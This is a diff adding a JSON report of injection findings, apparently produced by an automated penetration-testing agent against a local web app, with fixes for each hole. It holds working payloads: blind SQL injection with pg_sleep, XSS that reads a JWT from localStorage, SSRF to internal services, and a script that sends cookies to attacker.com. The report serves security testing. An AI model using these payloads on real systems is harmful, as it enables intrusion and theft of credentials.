@@ -1,0 +1,186 @@
+{
+  "agent": "a05-injection",
+  "target": "http://localhost:3000",
+  "findings": [
+    {
+      "id": "a05-f01",
+      "title": "Blind SQL Injection in GET /api/users?search via direct string concatenation",
+      "severity": "critical",
+      "confidence": "confirmed",
+      "category": "A05",
+      "cwe": "CWE-89",
+      "location": {
+        "file": "src/users/users.service.js",
+        "line": 33,
+        "endpoint": "GET /api/users?search="
+      },
+      "description": "The listUsers function builds a PostgreSQL query by directly interpolating the search parameter into a template literal: `AND (display_name ILIKE '%${search}%' OR email ILIKE '%${search}%' OR username ILIKE '%${search}%')`. The search parameter appears in all three positions simultaneously, and the entire query is further wrapped in `SELECT COUNT(*) FROM (${query}) as filtered`. A single quote breaks the query (500 error). Time-based blind extraction is fully confirmed: injecting `x') OR (SELECT 1 FROM pg_sleep(3))=1 AND ('1'='1` causes the query to sleep 3 seconds per ILIKE repetition (3 positions = ~9s delay). This proves arbitrary SQL execution in the PostgreSQL context.",
+      "evidence": {
+        "request_break": "curl -s 'http://localhost:3000/api/users?search=%27' -H 'Authorization: Bearer ADMIN_TOKEN'",
+        "response_break": "{\"error\":\"Failed to fetch users\"} (HTTP 500)",
+        "request_timebased": "curl -s -G 'http://localhost:3000/api/users' --data-urlencode \"search=x') OR (SELECT 1 FROM pg_sleep(3))=1 AND ('1'='1\" -H 'Authorization: Bearer ADMIN_TOKEN'",
+        "response_timebased": "{\"users\":[],\"pagination\":{\"page\":1,\"limit\":20,\"total\":0,\"pages\":0}} HTTP_CODE: 200 TIME: 12.052807s",
+        "server_log": "List users error: SELECT COUNT(*) as total FROM (SELECT id, username, display_name, role, avatar_url, bio, location, skills, created_at FROM users WHERE is_active = true AND (display_name ILIKE '%x') OR (SELECT 1 FROM pg_sleep(3))=1 AND ('1'='1%' OR email ILIKE '%x') ...)) as filtered",
+        "code_snippet": "query += ` AND (display_name ILIKE '%${search}%' OR email ILIKE '%${search}%' OR username ILIKE '%${search}%')`;"
+      },
+      "reproduction_steps": [
+        "Authenticate as any user (even admin for /api/users which requires admin role)",
+        "GET http://localhost:3000/api/users?search=x%27 -> 500 error confirms injection point",
+        "GET http://localhost:3000/api/users?search=x%27)+OR+(SELECT+1+FROM+pg_sleep(3))=1+AND+(%271%27%3D%271 (URL-encoded)",
+        "Observe response takes ~12 seconds (3 pg_sleep(3) calls) confirming arbitrary SQL execution"
+      ],
+      "impact": "Full PostgreSQL database access. An attacker with admin role can extract all user passwords (bcrypt hashes), emails, reset tokens, and any other data from the database. Can also enumerate schema and potentially read from other tables. Password hashes can be cracked offline.",
+      "suggested_fix": "Use parameterized queries for the search filter: `.where(function() { this.where('display_name', 'ilike', `%${search}%`).orWhere('email', 'ilike', `%${search}%`).orWhere('username', 'ilike', `%${search}%`) })` using Knex's query builder instead of string interpolation.",
+      "needs_poc": false
+    },
+    {
+      "id": "a05-f02",
+      "title": "Stored XSS in gig review comment rendered via dangerouslySetInnerHTML",
+      "severity": "high",
+      "confidence": "confirmed",
+      "category": "A05",
+      "cwe": "CWE-79",
+      "location": {
+        "file": "client/src/pages/GigDetail.jsx",
+        "line": 299,
+        "endpoint": "POST /api/reviews (storage) / GET /api/gigs/:id (render)"
+      },
+      "description": "Review comments submitted to POST /api/reviews are stored in PostgreSQL without sanitization. On the GigDetail page, review.comment is rendered using `dangerouslySetInnerHTML={{ __html: review.comment }}`, bypassing React's default HTML escaping. No Content Security Policy is set (helmet has contentSecurityPolicy: false). An attacker can submit a review with an XSS payload, and any user viewing that gig's detail page will have the script executed in their browser context, leaking JWT tokens, session data, or performing actions as the victim.",
+      "evidence": {
+        "stored_payload_request": "POST http://localhost:3000/api/reviews with body: {\"contract_id\":\"...\",\"reviewee_id\":\"...\",\"rating\":5,\"comment\":\"<img src=x onerror=alert(document.domain)>\"}",
+        "storage_confirmed": "GET http://localhost:3000/api/reviews/0f5e2d75-f81f-428b-a7bb-db8d59d49e50 returns: {\"review\":{\"id\":\"0f5e2d75...\",\"comment\":\"<img src=x onerror=alert(document.domain)>\",\"is_public\":true}}",
+        "existing_xss_review": "Review b2fadc07-cca9-4bec-81fc-98ea54c6eef2 on gig 69d60f4f02567030fd02b4fd already contains: <img src=x onerror=\"document.title=localStorage.getItem('hf_token')\">",
+        "sink_code": "client/src/pages/GigDetail.jsx:299: <div className=\"review-text\" dangerouslySetInnerHTML={{ __html: review.comment }} />",
+        "no_csp": "Response headers: no Content-Security-Policy header; X-XSS-Protection: 0"
+      },
+      "reproduction_steps": [
+        "As a user with a completed contract, POST /api/reviews with comment containing an XSS payload: <img src=x onerror=alert(document.domain)>",
+        "Review is stored without sanitization (HTTP 201)",
+        "GET /api/reviews?gig_id={gig_id} returns the raw HTML payload in the comment field",
+        "When any user visits /gigs/{gig-slug} in a browser, the script in review.comment executes via dangerouslySetInnerHTML",
+        "The hf_token from localStorage (JWT) can be exfiltrated: <img src=x onerror=\"document.title=localStorage.getItem('hf_token')\">"
+      ],
+      "impact": "JavaScript execution in any authenticated user's browser who views the gig. Can steal JWT tokens from localStorage (hf_token), make authenticated API calls on behalf of the victim, take over accounts, post fraudulent reviews, or redirect users to phishing sites. No CSP mitigates the attack.",
+      "suggested_fix": "Sanitize review.comment before rendering using DOMPurify: `dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(review.comment) }}`. Alternatively, render review.comment as plain text `{review.comment}`. Also implement a Content Security Policy.",
+      "needs_poc": false
+    },
+    {
+      "id": "a05-f03",
+      "title": "Server-Side Request Forgery (SSRF) via link-preview endpoint bypassing localhost-only blocklist",
+      "severity": "high",
+      "confidence": "confirmed",
+      "category": "A05",
+      "cwe": "CWE-918",
+      "location": {
+        "file": "src/messaging/messaging.service.js",
+        "line": 382,
+        "endpoint": "POST /api/messages/conversations/:id/link-preview"
+      },
+      "description": "The fetchLinkPreview function validates URLs but only blocks requests to `localhost` and `127.0.0.1`. It does not block private RFC-1918 IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16). An authenticated attacker can supply any internal IP to reach services on the internal Docker network. The function returns the page title, allowing limited data exfiltration from services that expose HTTP endpoints. Internal services confirmed reachable: Mailhog (172.19.0.3:8025), MinIO (172.19.0.4:9000).",
+      "evidence": {
+        "request_mailhog": "curl -s -X POST 'http://localhost:3000/api/messages/conversations/9cbe1fce-272f-4928-9f09-d64bed07bd2b/link-preview' -H 'Content-Type: application/json' -H 'Authorization: Bearer CLIENT_TOKEN' -d '{\"url\":\"http://172.19.0.3:8025\"}'",
+        "response_mailhog": "{\"url\":\"http://172.19.0.3:8025\",\"title\":\"MailHog\",\"description\":\"\",\"image\":null} HTTP: 200",
+        "request_minio": "curl -s -X POST '...link-preview' -d '{\"url\":\"http://172.19.0.4:9000/minio/health/live\"}'",
+        "response_minio": "{\"url\":\"http://172.19.0.4:9000/minio/health/live\",\"title\":\"172.19.0.4\",\"description\":\"\",\"image\":null} HTTP: 200",
+        "file_scheme_blocked": "{\"error\":\"Only HTTP and HTTPS URLs are supported\"} - file:// is blocked",
+        "localhost_blocked": "{\"error\":\"Cannot fetch local URLs\"} - 127.0.0.1 is blocked",
+        "code_snippet": "if (parsed.hostname === 'localhost' || parsed.hostname === '127.0.0.1') { return reject(new Error('Cannot fetch local URLs')); }"
+      },
+      "reproduction_steps": [
+        "Create a conversation with POST /api/messages/conversations",
+        "POST /api/messages/conversations/{id}/link-preview with body: {\"url\":\"http://172.19.0.3:8025\"}",
+        "Response contains {\"title\":\"MailHog\"} proving the request reached the internal Mailhog service",
+        "Try http://172.19.0.4:9000/minio/health/live for MinIO confirmation"
+      ],
+      "impact": "An attacker can probe and reach internal services on the Docker network that are not meant to be publicly accessible. Mailhog contains password reset emails with valid reset tokens; accessing Mailhog allows account takeover of any user who requested a password reset. MinIO hosts uploaded files. Redis (172.19.0.6:6379) and PostgreSQL (172.19.0.5:5432) are also on the internal network but are not HTTP services.",
+      "suggested_fix": "Implement a proper SSRF blocklist that covers all private IP ranges. Use a library like `ssrf-req-filter` or manually check if the resolved IP falls within 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16, and ::1/128. Resolve the hostname to IP before checking, to prevent DNS rebinding. Consider using an allowlist of known safe domains instead.",
+      "needs_poc": false
+    },
+    {
+      "id": "a05-f04",
+      "title": "NoSQL $where injection in MongoDB gig search (code-level; blocked by MongoDB 7 default config)",
+      "severity": "medium",
+      "confidence": "suspected",
+      "category": "A05",
+      "cwe": "CWE-943",
+      "location": {
+        "file": "src/gigs/gigs.service.js",
+        "line": 42,
+        "endpoint": "GET /api/gigs?tag_filter="
+      },
+      "description": "The gig search service directly interpolates the user-controlled `tag_filter` parameter into a MongoDB `$where` clause with a JavaScript function body: `query.$where = 'function() { var tags = this.tags || []; return ' + tag_filter + '; }'`. This would allow an attacker to inject arbitrary JavaScript executed in MongoDB's scripting engine. In MongoDB 7 (the deployed version), JavaScript execution for `$where` is disabled by default, so the injection causes a `MongoServerError: $where is not allowed in this context` error rather than executing code. If the MongoDB instance is configured with `javascriptEnabled: true` (which was the default in MongoDB < 4.4), this would be a full JavaScript injection RCE vulnerability in the database engine.",
+      "evidence": {
+        "request": "curl -s 'http://localhost:3000/api/gigs?tag_filter=true%7C%7C(function(){return%20true;})()' ",
+        "server_log": "MongoServerError: $where is not allowed in this context",
+        "mongodb_version": "7.0.31 (JavaScript disabled by default)",
+        "code_snippet": "if (tag_filter) { query.$where = `function() { var tags = this.tags || []; return ${tag_filter}; }`; }"
+      },
+      "reproduction_steps": [
+        "GET http://localhost:3000/api/gigs?tag_filter=true%7C%7Ctrue",
+        "Server returns an error (500) logged as: MongoServerError: $where is not allowed in this context",
+        "If MongoDB were configured with --enableMajorityReadConcern=false and --setParameter enableJavaScriptProtection=false, the JS would execute"
+      ],
+      "impact": "On MongoDB versions with JavaScript enabled (< 4.4 default or any version with javascriptEnabled=true), this allows extracting all documents from any MongoDB collection, bypassing query filters entirely. The current MongoDB 7 deployment blocks execution, but the code vulnerability remains. Redeployment to an older MongoDB version or config change would immediately expose this.",
+      "suggested_fix": "Remove the $where clause entirely. Replace complex tag boolean filters with MongoDB's standard query operators ($and, $or, $in, $all). If complex filtering is required, implement a safe expression parser that translates user input into structured MongoDB operators rather than raw JavaScript.",
+      "needs_poc": false
+    },
+    {
+      "id": "a05-f05",
+      "title": "HTML injection in Puppeteer-generated invoice PDF via unsanitized user display_name and milestone title",
+      "severity": "medium",
+      "confidence": "confirmed",
+      "category": "A05",
+      "cwe": "CWE-79",
+      "location": {
+        "file": "src/utils/pdf.js",
+        "line": 61,
+        "endpoint": "GET /api/contracts/:id/invoice"
+      },
+      "description": "The buildInvoiceHTML function in pdf.js constructs an HTML document using template literals that directly interpolate user-controlled values: `data.clientName` (the client's display_name from the database) and `data.items[].description` (milestone titles). This HTML is then passed to `page.setContent(html, { waitUntil: 'networkidle0' })` in Puppeteer (headless Chrome), which renders it as a full browser page before generating the PDF. A client who has updated their display_name to contain HTML/script tags will have those tags executed by headless Chrome during PDF generation. This enables Server-Side XSS in the Puppeteer context.",
+      "evidence": {
+        "code_sink": "src/utils/pdf.js:61: `${data.clientName}<br>\\n        ${data.clientEmail}`",
+        "puppeteer_call": "src/utils/pdf.js:16: await page.setContent(html, { waitUntil: 'networkidle0' })",
+        "data_flow": "src/contracts/contracts.service.js:442: clientName: client ? client.display_name : 'Unknown'",
+        "inject_display_name": "PUT /api/users/{id} with body {\"display_name\":\"<script>fetch('http://attacker.com/?c='+document.cookie)</script>\"} -> HTTP 200",
+        "invoice_generated": "GET /api/contracts/53d996e0.../invoice -> HTTP 200, 23898 bytes PDF generated without error"
+      },
+      "reproduction_steps": [
+        "As a client, PUT /api/users/{your_id} with display_name set to HTML injection: <script>fetch('http://attacker.com/?c='+document.cookie)</script>",
+        "GET /api/contracts/{contract_id}/invoice (any completed contract where you are the client)",
+        "Puppeteer renders the HTML with the injected script tag executing in headless Chrome context",
+        "The script can make requests to internal network services from the Puppeteer context (which runs as the app server)"
+      ],
+      "impact": "Scripts executed in the Puppeteer context run with the same network access as the Node.js server (inside the Docker container). An attacker could use this to reach internal services (Redis, PostgreSQL, MinIO, Mailhog) using fetch() from headless Chrome, perform SSRF with broader capabilities than the link-preview endpoint, or exfiltrate server-side data.",
+      "suggested_fix": "HTML-encode all user-supplied values before inserting them into the invoice HTML template. Use a utility function: `function escapeHtml(str) { return String(str).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }` and apply it to clientName, clientEmail, milestone titles, and any other user data in buildInvoiceHTML.",
+      "needs_poc": false
+    },
+    {
+      "id": "a05-f06",
+      "title": "Log injection via direct string concatenation of email in authentication failure logging",
+      "severity": "low",
+      "confidence": "confirmed",
+      "category": "A05",
+      "cwe": "CWE-117",
+      "location": {
+        "file": "src/auth/auth.controller.js",
+        "line": 87,
+        "endpoint": "POST /api/auth/login"
+      },
+      "description": "The login controller logs failed authentication attempts using string concatenation: `logger.warn('Failed login attempt for ' + email)`. While Winston's JSON file format serializes log entries safely, the console transport uses `simple()` format which renders this as a single unescaped string. An attacker could inject newline characters or format-specific control sequences into log entries. The impact is limited by express-validator's email format check which rejects emails with CRLF characters, preventing classic log forging. However, valid-looking email addresses with embedded control characters (null bytes, ANSI escape codes) can still manipulate log output rendering.",
+      "evidence": {
+        "code": "src/auth/auth.controller.js:87: logger.warn('Failed login attempt for ' + email);",
+        "log_format": "Winston simple() format: warn: Failed login attempt for <EMAIL>",
+        "validator_blocks_crlf": "POST /api/auth/login with email containing \\r\\n returns: {\"errors\":[{\"msg\":\"Valid email is required\"}]}",
+        "normal_log": "warn: Failed login attempt for pentester_client_1@test.com"
+      },
+      "reproduction_steps": [
+        "Observe that POST /api/auth/login logs: warn: Failed login attempt for <email>",
+        "Email validation (express-validator) prevents raw CRLF injection",
+        "However any valid email format can be used to inject text into log lines"
+      ],
+      "impact": "Low. The email validator prevents full CRLF log forgery. Impact is limited to log line pollution and potentially misleading log entries using valid email addresses containing special characters.",
+      "suggested_fix": "Use a structured log call: `logger.warn('Failed login attempt', { email: email })`. This ensures the email is serialized as a JSON value in both file and console transports, preventing any injection.",
+      "needs_poc": false
+    }
+  ]
+}
